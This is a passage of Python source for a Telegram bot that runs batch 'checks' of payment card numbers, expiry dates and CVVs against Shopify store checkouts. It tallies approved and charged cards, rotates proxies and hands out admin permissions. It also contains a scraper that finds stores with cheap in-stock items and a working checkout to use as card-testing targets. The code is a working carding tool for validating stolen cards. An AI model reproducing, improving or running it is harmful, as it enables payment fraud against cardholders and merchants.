        await update.message.reply_text(f"Failed to remove admin: {e}")

async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("Unauthorized.")
        return
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /addadmin <user_id>")
        return
    try:
        target = int(str(args[0]).strip())
    except Exception:
        await update.message.reply_text("Invalid user id")
        return
    try:
        policy = await get_access_policy()
        saved = set(policy.get("admin_ids") or [])
        
        # Check if already an admin
        if target in saved or target in ADMIN_IDS:
            await update.message.reply_text(f"✅ User {target} is already an admin")
            return
        
        # Add to admin_ids
        saved.add(target)
        policy["admin_ids"] = sorted(list(saved))
        
        # Remove from removed_admin_ids if present
        removed = set(policy.get("removed_admin_ids", []) or [])
        removed.discard(target)
        policy["removed_admin_ids"] = sorted(list(removed))
        
        await set_access_policy(policy)
        await update.message.reply_text(f"✅ Added admin: {target}")
    except Exception as e:
        await update.message.reply_text(f"Failed to add admin: {e}")

async def cmd_giveperm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "giveperm"):
        await update.message.reply_text("Unauthorized.")
        return
    full = (update.message.text or "").strip()
    args = context.args or []
    if len(args) < 2:
        await update.message.reply_text("Usage: /giveperm <user_id> <command>\nExample: /giveperm 5646492454 /addsite")
        return
    try:
        target = int(str(args[0]).strip())
    except Exception:
        await update.message.reply_text("Invalid user id")
        return
    cmd = str(args[1]).lstrip('/')
    if not cmd:
        await update.message.reply_text("Invalid command")
        return
    try:
        policy = await get_access_policy()
        perms = policy.get("perms") or {}
        key = str(int(target))
        cur = perms.get(key) or []
        if cmd.lower() not in [c.lower() for c in cur]:
            cur.append(cmd)
        perms[key] = cur
        policy["perms"] = perms
        await set_access_policy(policy)
        await update.message.reply_text(f"Granted permission '{cmd}' to user {target}")
    except Exception as e:
        await update.message.reply_text(f"Failed to grant permission: {e}")

async def cmd_retrieve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to retrieve working_sites.txt, approved.txt, or user_proxies.txt files"""
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("❌ Unauthorized. Admin only.")
        return
    
    args = context.args or []
    if not args:
        return
    
    filename = args[0].strip()
    
    if filename not in ["working_sites.txt", "approved.txt", "user_proxies.txt"]:
        await update.message.reply_text("❌ Invalid filename.")
        return
    
    # Map filename to actual file path
    file_paths = {
        "working_sites.txt": "working_sites.txt",
        "approved.txt": "approved.txt",
        "user_proxies.txt": "ng/user_proxies.txt"
    }
    
    file_path = file_paths.get(filename, filename)
    
    if not os.path.exists(file_path):
        await update.message.reply_text(f"❌ File '{filename}' not found on server.")
        return
    
    try:
        file_size = os.path.getsize(file_path)
        if file_size == 0:
            await update.message.reply_text(f"❌ File '{filename}' is empty.")
            return
        
        with open(file_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=filename,
                caption=f"📄 Retrieved: {filename}\n\n📊 Size: {file_size:,} bytes"
            )
        
        logger.info(f"Admin {user.id} ({user.full_name}) retrieved file: {filename}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to retrieve file: {e}")
        logger.error(f"Error retrieving {filename} for admin {user.id}: {e}")

async def stop_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        q = update.callback_query
        data = (q.data or "").strip()
        if not data.startswith("STOP:"):
            await q.answer()
            return
        batch_id = data.split(":", 1)[1]
        await q.answer("Stopping...")
        rec = None
        async with ACTIVE_LOCK:
            rec = ACTIVE_BATCHES.get(batch_id)
        if rec:
            try:
                # Set cancel event
                event = rec.get("event")
                if event:
                    event.set()
            except Exception:
                pass
            try:
                # Cancel all tasks
                tasks = rec.get("tasks", [])
                for t in tasks:
                    if not t.done():
                        t.cancel()
            except Exception:
                pass
            try:
                # Mark as cancelled in ACTIVE_BATCHES
                rec["cancelled"] = True
            except Exception:
                pass
            try:
                # Update message immediately to show stop status
                progress = rec.get("progress")
                if progress:
                    chat_id, msg_id = progress
                    try:
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=msg_id,
                            text="⏹ <b>Stopping...</b>\n\nProcessing remaining tasks and preparing results...",
                            parse_mode=ParseMode.HTML,
                            reply_markup=None
                        )
                    except Exception:
                        pass
            except Exception:
                pass
            try:
                await q.edit_message_reply_markup(reply_markup=None)
            except Exception:
                pass
            try:
                await remove_pending(batch_id)
            except Exception:
                pass
    except Exception:
        try:
            await update.effective_chat.send_message("Stop requested.")
        except Exception:
            pass

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    stopped = 0
    async with ACTIVE_LOCK:
        items = list(ACTIVE_BATCHES.items())
    for bid, rec in items:
        try:
            if rec.get("chat_id") == chat.id and rec.get("user_id") == user.id:
                try:
                    rec.get("event").set()
                except Exception:
                    pass
                try:
                    for t in rec.get("tasks", []):
                        if not t.done():
                            t.cancel()
                except Exception:
                    pass
                stopped += 1
        except Exception:
            continue
    if stopped > 0:
        await update.message.reply_text(f"Stopping {stopped} running batch(es)...")
    else:
        await update.message.reply_text("No running batch found.")

async def cmd_stop_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to stop a specific user's running checks.
    Usage: /stop <user_id>
    """
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("Only admins can stop other users' checks.")
        return

    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /stop <user_id>\nExample: /stop 123456789")
        return

    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("Invalid user ID. Must be a number.")
        return

    stopped = 0
    async with ACTIVE_LOCK:
        items = list(ACTIVE_BATCHES.items())
    
    for bid, rec in items:
        try:
            if rec.get("user_id") == target_id:
                try:
                    rec.get("event").set()
                except Exception:
                    pass
                try:
                    for t in rec.get("tasks", []):
                        if not t.done():
                            t.cancel()
                except Exception:
                    pass
                try:
                    chat_id, msg_id = rec.get("progress") or (None, None)
                    if chat_id and msg_id:
                        await context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=msg_id, reply_markup=None)
                except Exception:
                    pass
                stopped += 1
        except Exception:
            continue

    if stopped > 0:
        await update.message.reply_text(f"Stopped {stopped} running batch(es) for user {target_id}")
    else:
        await update.message.reply_text(f"No running batches found for user {target_id}")

async def cmd_active(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if not await ensure_access(update, context):
        return

    try:
        async with ACTIVE_LOCK:
            items = list(ACTIVE_BATCHES.items())
    except Exception as e:
        logger.error(f"Error accessing ACTIVE_BATCHES: {e}")
        await update.message.reply_text("Error accessing active batches data.")
        return

    if not items:
        try:
            pend = await list_pending()
        except Exception:
            pend = {}
        if not isinstance(pend, dict) or not pend:
            await update.message.reply_text(
                "⏳ <b>No Active Checks</b>\n\n"
                "There are currently no active checks running.\n"
                "Start a check using <code>/txt</code>, <code>/sh</code>, <code>/st</code>, or <code>/sc</code>!",
                parse_mode=ParseMode.HTML
            )
            return
        lines = ["⏰ <b>Scheduled Checks (Starting Soon):</b>\n"]
        for pbid, payload in list(pend.items())[:10]:
            try:
                title = (payload.get("title") or "Batch")
                cards = payload.get("cards") or []
                sites = payload.get("sites") or []
                lines.append(f"📦 <b>{title}</b>\n   💳 Cards: <code>{len(cards)}</code> | 🌐 Sites: <code>{len(sites)}</code>\n")
            except Exception:
                continue
        await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        return

    lines = ["🔥 <b>Active Checks (All Users):</b>\n"]
    now = time.time()
    for bid, rec in items:
        counts = rec.get("counts") or {}
        total = counts.get("total", 0)
        processed = counts.get("processed", 0)
        approved = counts.get("approved", 0)
        charged = counts.get("charged", 0)
        start_ts = counts.get("start_ts", None)
        title = counts.get("title") or "Batch"

        uid = rec.get("user_id")
        who = ""
        try:
            who = (rec.get("user_name") or "").strip()
        except Exception:
            who = ""
        try:
            username = (rec.get("user_username") or "").strip() if isinstance(rec.get("user_username"), str) else ""
        except Exception:
            username = ""
        if (not who) or who.isdigit() or (not username):
            try:
                s = await get_user_stats(int(uid))
                n = (s.get("name") or "").strip()
                u = (s.get("username") or "").strip()
                if (not who) or who.isdigit():
                    if n:
                        who = n
                if (not username) and u:
                    username = u
            except Exception:
                pass
        if (not who) or who.isdigit() or (not username):
            try:
                chat_obj = await context.bot.get_chat(int(uid))
                try:
                    full = getattr(chat_obj, "full_name", None)
                except Exception:
                    full = None
                if not full:
                    try:
                        first = getattr(chat_obj, "first_name", "") or ""
                        last = getattr(chat_obj, "last_name", "") or ""
                        full = f"{first} {last}".strip()
                    except Exception:
                        full = None
                if (not who) or who.isdigit():
                    if isinstance(full, str) and full.strip():
                        who = full.strip()
                un = None
                try:
                    un = getattr(chat_obj, "username", None)
                except Exception:
                    un = None
                if (not username) and isinstance(un, str) and un.strip():
                    username = un.strip()
                try:
                    async with ACTIVE_LOCK:
                        cur = ACTIVE_BATCHES.get(bid)
                        if cur is not None:
                            if who:
                                cur["user_name"] = who
                            if username:
                                cur["user_username"] = username
                            ACTIVE_BATCHES[bid] = cur
                except Exception:
                    pass
                try:
                    with STATS_LOCK:
                        s2 = _load_stats()
                        key = str(uid)
                        cur_stat = s2.get(key, {})
                        if isinstance(who, str) and who.strip():
                            cur_stat["name"] = who.strip()
                        if isinstance(username, str) and username.strip():
                            cur_stat["username"] = username.strip()
                        s2[key] = cur_stat
                        _save_stats(s2)
                except Exception:
                    pass
            except Exception:
                pass
        if not who:
            who = str(uid)

        try:
            elapsed = (now - float(start_ts)) if isinstance(start_ts, (int, float)) else 0.0
        except Exception:
            elapsed = 0.0

        try:
            derived_declined = max(0, int(processed or 0) - int(approved or 0) - int(charged or 0))
        except Exception:
            derived_declined = 0

        progress_str = f"{processed}/{total}" if isinstance(total, int) and isinstance(processed, int) else "N/A"
        
        # Use name (or username if name not available)
        if not who or who.isdigit():
            if isinstance(username, str) and username.strip():
                who = username.strip() if username.startswith("@") else f"@{username.strip()}"
        
        # Create clickable user link (just the name, no @username in brackets)
        if uid:
            user_link = f'<a href="tg://user?id={uid}">{who}</a>'
        else:
            user_link = who
        
        # Format elapsed time nicely
        if elapsed < 60:
            elapsed_str = f"{elapsed:.1f}s"
        elif elapsed < 3600:
            elapsed_str = f"{elapsed/60:.1f}m"
        else:
            elapsed_str = f"{elapsed/3600:.1f}h"
        
        lines.append(
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 <b>{title}</b>\n"
            f"👤 User: {user_link}\n"
            f"🆔 UID: <code>{uid}</code>\n"
            f"📊 Progress: <code>{progress_str}</code>\n"
            f"✅ Approved: <code>{approved}</code> | "
            f"❌ Declined: <code>{derived_declined}</code> | "
            f"💎 Charged: <code>{charged}</code>\n"
            f"⏱️ Elapsed: <code>{elapsed_str}</code>\n"
        )

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML, disable_web_page_preview=True)

async def pref_approved_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        q = update.callback_query
        data = (q.data or "").strip()
        send_approved = data.upper().endswith("YES")
        await q.answer()
    except Exception:
        send_approved = True

    try:
        if not await ensure_access(update, context):
            return
    except Exception:
        pass
    
    user = update.effective_user
    
    # Check if user already has an active batch (admins bypass)
    if await has_active_batch(user.id):
        try:
            await update.effective_chat.send_message(
                "⏸️ <b>Already Running a Check</b>\n\n"
                "You already have an active check running. Please wait for it to complete or use /stop to cancel it.\n\n"
                "You can only run one check at a time.",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
        return

    cards = context.chat_data.get("pending_cards") or []
    sites = context.chat_data.get("pending_sites") or []
    title = context.chat_data.get("pending_title") or "File Batch"

    if not cards:
        txt_path = context.chat_data.get("last_txt_path")
        if not (txt_path and os.path.exists(txt_path)):
            await update.effective_chat.send_message("No pending file. Please send a .txt and use /txt again.")
            return
        cards = parse_cards_from_file(txt_path)

    if not sites:
        sites = checkout.read_sites_from_file("working_sites.txt")
    if not sites:
        await update.effective_chat.send_message("No sites found in working_sites.txt.")
        return

    batch_id = f"{update.effective_chat.id}:{time.time_ns()}"
    cancel_event = asyncio.Event()
    proxy_mapping = None
    try:
        saved_list = await get_user_proxies(update.effective_user.id)
        if isinstance(saved_list, list) and len(saved_list) > 0:
            proxy_mapping = list(saved_list)
            try:
                await update.effective_chat.send_message(f"🔒 Using your {len(saved_list)} saved {'proxy' if len(saved_list) == 1 else 'proxies'}")
            except Exception:
                pass
    except Exception:
        proxy_mapping = None
    try:
        chosen_executor = GLOBAL_EXECUTOR if (isinstance(cards, list) and len(cards) > SMALL_BATCH_THRESHOLD) else SMALL_TASK_EXECUTOR
    except Exception:
        chosen_executor = GLOBAL_EXECUTOR
    runner = BatchRunner(cards, sites, chosen_executor, batch_id, update.effective_chat.id, update.effective_user.id, cancel_event, send_approved_notifications=send_approved, proxies_override=proxy_mapping)
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES[batch_id] = {
                "event": cancel_event,
                "tasks": [],
                "chat_id": update.effective_chat.id,
                "user_id": update.effective_user.id,
                "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
                "user_username": getattr(update.effective_user, "username", None),
                "progress": (None, None),
                "counts": {
                    "total": len(cards),
                    "processed": 0,
                    "approved": 0,
                    "declined": 0,
                    "charged": 0,
                    "start_ts": runner.start_ts,
                    "title": title,
                },
            }
    except Exception:
        pass
    try:
        await add_pending(batch_id, {
            "batch_id": batch_id,
            "user_id": update.effective_user.id,
            "chat_id": update.effective_chat.id,
            "title": title,
            "cards": cards,
            "sites": sites,
            "send_approved_notifications": bool(send_approved),
        })
    except Exception:
        pass
    context.application.create_task(runner.run_with_notifications(update, context, title=title))

    try:
        context.chat_data.pop("pending_cards", None)
        context.chat_data.pop("pending_sites", None)
        context.chat_data.pop("pending_title", None)
    except Exception:
        pass
    try:
        await q.edit_message_reply_markup(reply_markup=None)
    except Exception:
        pass

def _mask_proxy_display(url: str) -> str:
    try:
        from urllib.parse import urlparse
        uu = urlparse(url)
        nl = uu.netloc
        if "@" in nl:
            creds, host = nl.split("@", 1)
            if ":" in creds:
                usr = creds.split(":", 1)[0]
                return f"{uu.scheme}://{usr}:****@{host}"
            return f"{uu.scheme}://****@{host}"
        return f"{uu.scheme}://{nl}"
    except Exception:
        return url

async def cmd_st_cc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    
    full_text = (update.message.text or "").strip()
    cards_text = ""
    
    try:
        if full_text.lower().startswith("/st"):
            cards_text = full_text.split(" ", 1)[1] if len(full_text.split(" ", 1)) > 1 else ""
    except Exception:
        cards_text = ""
    
    if not cards_text:
        replied = update.message.reply_to_message
        if replied and isinstance(getattr(replied, "text", None), str) and replied.text.strip():
            cards_text = replied.text.strip()
    
    if not cards_text:
        await update.message.reply_text(
            "Usage:\n"
        )
        return
    
    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]
    
    if len(card_lines) > 25:
        await update.message.reply_text(f"Too many cards. Maximum allowed is 25. Processing first 25.")
        card_lines = card_lines[:25]
    
    user_proxies = None
    try:
        saved_proxies = await get_user_proxies(update.effective_user.id)
        if isinstance(saved_proxies, list) and len(saved_proxies) > 0:
            user_proxies = list(saved_proxies)
            try:
                await update.message.reply_text(f"🔒 Using your {len(saved_proxies)} saved {'proxy' if len(saved_proxies) == 1 else 'proxies'}")
            except Exception:
                pass
    except Exception:
        user_proxies = None
    
    cards = []
    for i, card_line in enumerate(card_lines):
        try:
            number, month, year, cvc = card_line.split('|')
            if not all([number, month, year, cvc]):
                await update.message.reply_text(f"Invalid card format at line {i+1}: {card_line}\nUse: number|month|year|cvv")
                continue
            cards.append({
                "number": number.strip(),
                "month": month.strip(),
                "year": year.strip(),
                "verification_value": cvc.strip()
            })
        except Exception:
            await update.message.reply_text(f"Error parsing card at line {i+1}: {card_line}\nUse format: number|month|year|cvv")
            continue
    
    if not cards:
        await update.message.reply_text("No valid cards found to process.")
        return
        
    batch_id = f"{update.effective_chat.id}:{time.time_ns()}"
    cancel_event = asyncio.Event()
    runner = BatchRunner(
        cards=cards,
        executor=GLOBAL_EXECUTOR,
        batch_id=batch_id,
        chat_id=update.effective_chat.id,
        user_id=update.effective_user.id,
        cancel_event=cancel_event,
        proxies_override=user_proxies
    )
    
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES[batch_id] = {
                "event": cancel_event,
                "tasks": [],
                "chat_id": update.effective_chat.id,
                "user_id": update.effective_user.id,
                "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
                "user_username": getattr(update.effective_user, "username", None),
                "counts": {
                    "total": len(cards),
                    "processed": 0,
                    "approved": 0,
                    "declined": 0,
                    "charged": 0,
                    "start_ts": time.time(),
                    "title": "ST Check"
                }
            }
    except Exception:
        pass

    context.application.create_task(runner.run_with_notifications(update, context, title="ST Check"))

async def cmd_allowuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Allow a user to use the bot in private chat even when groups-only mode is active."""
    user = update.effective_user
    if not await has_permission(user.id, "allowuser"):
        await update.message.reply_text("Unauthorized.")
        return
        
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /allowuser <user_id>")
        return
        
    try:
        target_id = int(args[0])
        policy = await get_access_policy()
        bypass_users = policy.get("bypass_groups_only", []) or []
        
        if target_id in bypass_users:
            await update.message.reply_text(f"User {target_id} is already allowed to bypass groups-only mode.")
            return
            
        bypass_users.append(target_id)
        policy["bypass_groups_only"] = bypass_users
        await set_access_policy(policy)
        
        await update.message.reply_text(f"User {target_id} can now use the bot in private chat even when groups-only mode is active.")
        
    except ValueError:
        await update.message.reply_text("Invalid user ID. Must be a number.")
    except Exception as e:
        await update.message.reply_text(f"Failed to update policy: {e}")

async def cmd_rmuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a user's permission to bypass groups-only mode."""
    user = update.effective_user
    if not await has_permission(user.id, "rmuser"):
        await update.message.reply_text("Unauthorized.")
        return
        
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /rmuser <user_id>")
        return
        
    try:
        target_id = int(args[0])
        policy = await get_access_policy()
        bypass_users = policy.get("bypass_groups_only", []) or []
        
        if target_id not in bypass_users:
            await update.message.reply_text(f"User {target_id} is not in the bypass list.")
            return
            
        bypass_users.remove(target_id)
        policy["bypass_groups_only"] = bypass_users
        await set_access_policy(policy)
        
        await update.message.reply_text(f"User {target_id} removed from groups-only bypass list.")
    except ValueError:
        await update.message.reply_text("Invalid user ID. Must be a number.")
    except Exception as e:
        await update.message.reply_text(f"Failed to update policy: {e}")

async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all users in the allowuser bypass list (admin only)."""
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("Unauthorized.")
        return
    
    try:
        policy = await get_access_policy()
        bypass_users = policy.get("bypass_groups_only", []) or []
        
        if not bypass_users:
            await update.message.reply_text("📋 <b>Allowuser Bypass List</b>\n\nNo users have been granted bypass permission yet.\n\nUse /allowuser <user_id> to add users.", parse_mode=ParseMode.HTML)
            return
        
        msg = "📋 <b>Allowuser Bypass List</b>\n\n"
        msg += f"Users allowed to use the bot in private chat (even when groups-only mode is active):\n\n"
        
        for idx, user_id in enumerate(sorted(bypass_users), 1):
            msg += f"{idx}. <code>{user_id}</code>\n"
        
        msg += f"\n<b>Total:</b> {len(bypass_users)} user(s)"
        
        await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await update.message.reply_text(f"Failed to retrieve bypass list: {e}")

# ==================== SCRAPER COMMAND ====================

ACTIVE_SCRAPERS: Dict[str, Dict] = {}
SCRAPER_LOCK = asyncio.Lock()

async def cmd_scr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command: Scrape and validate N Shopify sites"""
    if not await ensure_access(update, context):
        return
    
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Admin only
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ This command is for admins only.")
        return
    
    try:
        # Parse argument
        if not context.args or len(context.args) < 1:
            await update.message.reply_text(
                "📝 <b>Usage:</b> /scr N\n\n"
                "Where N = number of sites to discover and validate (no limit)\n\n"
                "<b>Examples:</b>\n"
                "• /scr 100\n"
                "• /scr 10000\n"
                "• /scr 1,000,000\n\n"
                "The scraper will:\n"
                "✅ Test your proxies first\n"
                "✅ Discover N Shopify sites\n"
                "✅ Validate each site (full checkout test)\n"
                "✅ Save working sites with proxies\n"
                "✅ Send results as file\n\n"
                "💡 <i>No limits - scrape as many sites as you need!</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        try:
            # Allow comma-separated numbers and strip whitespace
            num_str = context.args[0].replace(',', '').strip()
            num_sites = int(num_str)
            if num_sites < 1:
                raise ValueError()
        except (ValueError, AttributeError):
            await update.message.reply_text(
                "❌ Invalid number. Please provide a positive integer.\n\n"
                "Examples: /scr 100, /scr 10000, /scr 1,000,000",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Check if user already has an active scraper
        async with SCRAPER_LOCK:
            existing = ACTIVE_SCRAPERS.get(f"{user_id}_{chat_id}")
            if existing and not existing.get("event").is_set():
                await update.message.reply_text("⚠️ You already have an active scraper running. Stop it first with the button.")
                return
        
        # Get user's proxies
        user_proxies = await get_user_proxies(user_id)
        
        if not user_proxies:
            await update.message.reply_text(
                "⚠️ No proxies found! Please add proxies first using /setpr\n\n"
                "<b>Example:</b>\n"
                "/setpr http://user:pass@1.2.3.4:8080",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Create scraper session
        scraper_id = f"{user_id}_{chat_id}_{int(time.time())}"
        cancel_event = asyncio.Event()
        
        async with SCRAPER_LOCK:
            ACTIVE_SCRAPERS[f"{user_id}_{chat_id}"] = {
                "scraper_id": scraper_id,
                "event": cancel_event,
                "user_id": user_id,
                "chat_id": chat_id,
                "start_time": time.time(),
                "working_sites": {},
                "failed_sites": set(),
                "total_checked": 0,
                "target_sites": num_sites
            }
        
        # Create stop button
        keyboard = [[InlineKeyboardButton("🛑 Stop Scraper", callback_data=f"STOP_SCR:{user_id}_{chat_id}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send initial message
        num_sites_formatted = f"{num_sites:,}" if num_sites >= 1000 else str(num_sites)
        init_msg = await update.message.reply_text(
            f"🚀 <b>Starting Scraper...</b>\n\n"
            f"🎯 Target: {num_sites_formatted} sites\n"
            f"🔌 Proxies: {len(user_proxies)} loaded\n"
            f"📊 Status: Testing proxies...\n\n"
            f"⏳ Please wait...\n\n"
            f"💡 <i>This may take a while for large batches. You can stop anytime with the button below.</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
        
        # Run scraper in background
        loop = asyncio.get_event_loop()
        task = loop.create_task(
            run_scraper_task(
                user_id, chat_id, num_sites, user_proxies, 
                cancel_event, init_msg, scraper_id
            )
        )
        
        # Store task
        async with SCRAPER_LOCK:
            if f"{user_id}_{chat_id}" in ACTIVE_SCRAPERS:
                ACTIVE_SCRAPERS[f"{user_id}_{chat_id}"]["task"] = task
        
    except Exception as e:
        logger.error(f"Error in cmd_scr: {e}")
        await update.message.reply_text(f"❌ Error starting scraper: {e}")

async def run_scraper_task(user_id, chat_id, num_sites, user_proxies, cancel_event, progress_msg, scraper_id):
    """Run the scraper in background with progress updates"""
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    from concurrent.futures import ThreadPoolExecutor, as_completed
    
    scraper_key = f"{user_id}_{chat_id}"
    
    try:
        # Step 1: Test proxies
        await progress_msg.edit_text(
            f"🔍 <b>Testing Proxies...</b>\n\n"
            f"Found: {len(user_proxies)} proxies\n"
            f"Testing: In progress...\n\n"
            f"⏳ Please wait...",
            parse_mode=ParseMode.HTML,
            reply_markup=progress_msg.reply_markup
        )
        
        working_proxies = []
        failed_proxy_count = 0
        
        def test_single_proxy(proxy_url):
            try:
                session = requests.Session()
                session.proxies = {"http": proxy_url, "https": proxy_url}
                r = session.get("https://httpbin.org/ip", timeout=10, verify=False)
                return proxy_url if r.status_code == 200 else None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=min(20, len(user_proxies))) as executor:
            futures = {executor.submit(test_single_proxy, p): p for p in user_proxies}
            for future in as_completed(futures):
                if cancel_event.is_set():
                    break
                result = future.result()
                if result:
                    working_proxies.append(result)
                else:
                    failed_proxy_count += 1
        
        if cancel_event.is_set():
            await send_scraper_results(user_id, chat_id, progress_msg, scraper_id, cancelled=True)
            return
        
        if not working_proxies:
            await progress_msg.edit_text(
                "❌ <b>No Working Proxies!</b>\n\n"
                "All proxies failed the test. Please add working proxies with /setpr",
                parse_mode=ParseMode.HTML,
                reply_markup=None
            )
            return
        
        # Step 2: Discover and validate sites
        num_sites_formatted = f"{num_sites:,}" if num_sites >= 1000 else str(num_sites)
        await progress_msg.edit_text(
            f"✅ <b>Proxy Test Complete</b>\n\n"
            f"✅ Working: {len(working_proxies)}/{len(user_proxies)} proxies\n"
            f"❌ Failed: {failed_proxy_count}\n\n"
            f"🔎 Discovering sites...\n"
            f"🎯 Target: {num_sites_formatted} sites",
            parse_mode=ParseMode.HTML,
            reply_markup=progress_msg.reply_markup
        )
        
        # Import scraper functions
        discovered_sites = await discover_sites_async(num_sites, cancel_event)
        
        if cancel_event.is_set():
            await send_scraper_results(user_id, chat_id, progress_msg, scraper_id, cancelled=True)
            return
        
        # Step 3: Validate sites
        discovered_count = len(discovered_sites)
        discovered_formatted = f"{discovered_count:,}" if discovered_count >= 1000 else str(discovered_count)
        await progress_msg.edit_text(
            f"✅ <b>Discovery Complete</b>\n\n"
            f"📊 Discovered: {discovered_formatted} sites\n\n"
            f"🧪 Starting validation...\n"
            f"📈 Progress: 0/{discovered_formatted}",
            parse_mode=ParseMode.HTML,
            reply_markup=progress_msg.reply_markup
        )
        
        # Validate sites with progress tracking
        await validate_sites_with_progress(
            discovered_sites, working_proxies, cancel_event,
            progress_msg, scraper_key, user_id, chat_id
        )
        
        # Send final results
        await send_scraper_results(user_id, chat_id, progress_msg, scraper_id, cancelled=False)
        
    except Exception as e:
        logger.error(f"Error in scraper task: {e}")
        try:
            await progress_msg.edit_text(
                f"❌ <b>Scraper Error</b>\n\n"
                f"Error: {str(e)[:200]}\n\n"
                f"Please try again or contact admin.",
                parse_mode=ParseMode.HTML,
                reply_markup=None
            )
        except:
            pass
    finally:
        # Cleanup
        async with SCRAPER_LOCK:
            if scraper_key in ACTIVE_SCRAPERS:
                del ACTIVE_SCRAPERS[scraper_key]

async def discover_sites_async(count, cancel_event):
    """Discover Shopify sites using patterns"""
    sites = set()
    
    # Expanded word lists
    prefixes = ['shop', 'store', 'official', 'boutique', 'the-', 'my-', 'get-', 'buy-']
    words = [
        'fashion', 'style', 'beauty', 'apparel', 'clothing', 'boutique', 'gifts',
        'accessories', 'jewelry', 'watches', 'gadgets', 'tech', 'home', 'decor',
        'kids', 'baby', 'toys', 'games', 'sports', 'fitness', 'outdoor', 'lifestyle',
        'vape', 'cbd', 'cosmetics', 'makeup', 'shoes', 'sneakers', 'bags', 'phone',
        'pet', 'dog', 'cat', 'coffee', 'tea', 'snacks', 'treats'
    ]
    
    attempts = 0
    max_attempts = count * 5
    
    while len(sites) < count and attempts < max_attempts:
        if cancel_event.is_set():
            break
        
        attempts += 1
        
        # Generate domain
        if random.random() < 0.3:
            name = f"{random.choice(prefixes)}{random.choice(words)}"
        else:
            name = random.choice(words)
        
        if random.random() < 0.3:
            name += str(random.randint(1, 999))
        
        domain = f"{name}.myshopify.com"
        sites.add(domain)
        
        await asyncio.sleep(0)  # Yield control
    
    return sites

async def validate_sites_with_progress(sites, proxies, cancel_event, progress_msg, scraper_key, user_id, chat_id):
    """Validate sites with progress updates"""
    import requests
    from concurrent.futures import ThreadPoolExecutor, as_completed
    
    proxy_idx = 0
    start_time = time.time()
    last_update = time.time()
    
    def validate_single_site(domain):
        nonlocal proxy_idx
        
        try:
            # Get proxy
            proxy_url = proxies[proxy_idx % len(proxies)]
            proxy_idx += 1
            
            session = requests.Session()
            session.proxies = {"http": proxy_url, "https": proxy_url}
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            # Normalize URL
            url = f"https://{domain}" if not domain.startswith('http') else domain
            
            # Quick Shopify check
            r = session.get(f"{url}/products.json?limit=3", timeout=10, verify=False)
            if r.status_code != 200:
                return domain, False, "HTTP error", None, None
            
            data = r.json()
            products = data if isinstance(data, list) else data.get('products', [])
            
            # Find cheapest product under $22
            cheapest_price = None
            cheapest_variant_id = None
            product_name = None
            
            for product in products[:3]:
                variants = product.get('variants', [])
                title = product.get('title', '')
                
                for variant in variants:
                    price = variant.get('price')
                    available = variant.get('available')
                    variant_id = variant.get('id')
                    
                    if price and float(price) > 0 and float(price) < 22 and available and variant_id:
                        if cheapest_price is None or float(price) < cheapest_price:
                            cheapest_price = float(price)
                            cheapest_variant_id = variant_id
                            product_name = title
            
            if not cheapest_variant_id:
                return domain, False, "No products under $22", None, None
            
            # Test add to cart
            time.sleep(random.uniform(0.3, 0.7))
            r = session.post(f"{url}/cart/add.js", json={"id": cheapest_variant_id, "quantity": 1}, timeout=10, verify=False)
            
            if r.status_code not in [200, 201]:
                return domain, False, "Cart failed", None, None
            
            # Test checkout
            time.sleep(random.uniform(0.3, 0.7))
            r = session.get(f"{url}/checkout", allow_redirects=True, timeout=10, verify=False)
            
            if '/checkouts/cn/' not in r.url:
                return domain, False, "No checkout token", None, None
            
            # Success!
